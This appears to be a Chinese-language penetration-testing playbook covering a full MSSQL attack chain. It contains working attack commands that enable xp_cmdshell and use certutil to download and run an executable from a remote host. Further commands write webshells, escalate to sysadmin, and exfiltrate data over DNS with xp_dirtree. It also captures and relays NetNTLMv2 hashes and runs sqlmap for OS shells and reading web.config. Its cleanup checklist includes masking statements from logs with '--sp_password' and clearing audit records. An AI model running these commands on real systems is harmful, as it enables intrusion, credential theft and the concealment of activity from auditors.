# MSSQL 完整利用链

## A. 无 preauth 注入 → 直连 TDS 打库
```python
# pymssql 比 impacket 更少姿势坑（impacket 失败会静默关连接，易误判成 tarpit）
import pymssql
try:
    c = pymssql.connect(server=HOST, port=1433, user=U, password=P, login_timeout=5, timeout=5)
except Exception as e:
    print(type(e).__name__, e)   # 18456=口令错/用户错; state 8=密码错 7=用户不存在 38=凭据对但库打不开
```
- 手搓 PRELOGIN 若收到 `"Connection timed out"` + GUID 文本 → **1433 前面有连接代理/审计网关**（不是 tarpit）。
- **无用户名枚举 oracle**：MSSQL 对存在/不存在用户回同一条 `18456 Login failed for user 'X'` → 只能靠"登录成功"当信号。
- FreeTDS 抓原始令牌：`TDSDUMP=/path/tds.log`，比看客户端报错准。
- **并发纪律见 SKILL.md Pitfalls（本项目 40 线程把生产拖到 HYT00）。**

## B. 注入 → shell（三条路）
1. **xp_cmdshell（首选，需 sysadmin）**
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://x/f.exe c:\f.exe';
EXEC master..xp_cmdshell 'c:\f.exe';
EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;   -- 还原
```
2. **写 webshell**：先找 web 绝对路径（报错/字典/`xp_dirtree` 落表/`for /r` 递归）→ 差异备份或 log 备份写 `shell.asp|aspx|php`（内容 hex 避免引号转义）→ 访问验证。
3. **OLE / CLR / 外部脚本**：见 payloads.md「命令执行」。

## C. 提权
```sql
EXEC AS LOGIN='sa';                      -- IMPERSONATE 误配, 最高性价比
-- ... 干活 ...
REVERT;
EXEC master.dbo.sp_addsrvrolemember 'U','sysadmin';    -- 直接提(需 sysadmin/securityadmin)
-- 老版本: 沙盒(Jet SandBoxMode) / xp_regwrite / IFEO sethc
```

## D. OOB 外带（无回显时的数据出口）
1. 备好 collaborator/interactsh。
2. 数据拼进 UNC 主机名 + `xp_dirtree`（或权限够时的 `fn_*`/DMF）。
3. 长数据分块 / hex，收多条 DNS 记录再拼。
4. 同时可抓 `NetNTLMv2` → 离线破解或 `ntlmrelayx` 中继到另一台 MSSQL（连接串用命名管道让 SPN 变 `CIFS/HOST`）。
5. 条件：服务器能出 DNS/445，且未被 EPA 保护。

## E. 工具命令
```bash
sqlmap -r req.txt --batch --dbms=mssql --level 5 --risk 3 --technique=BEUST --sql-shell
sqlmap -u URL --file-read "C:/inetpub/wwwroot/web.config"
sqlmap -u URL --os-shell --os-pwn --msf-path=/opt/metasploit
sqlmap -u URL --reg-read --reg-key=HKLM\\SOFTWARE\\...
impacket-mssqlclient DOMAIN/u@host -windows-auth
PowerShell: Get-SQLServerLinkCrawl / Invoke-SQLUNCohInfo
```

## F. OPSEC 还原清单（本项目硬要求）
- [ ] `xp_cmdshell` 关回 0 + RECONFIGURE
- [ ] `EXEC AS LOGIN` 后 `REVERT`
- [ ] 删 `#tmp`/自建表/webshell/`.bak`
- [ ] 不新增管理员账号（必须建则事后删 + 清审计）
- [ ] 语句尾部 `--sp_password` 掩日志
- [ ] 记录每条 payload + 原始响应（报告复现需要）
- [ ] 报告里写清"对生产有无影响"
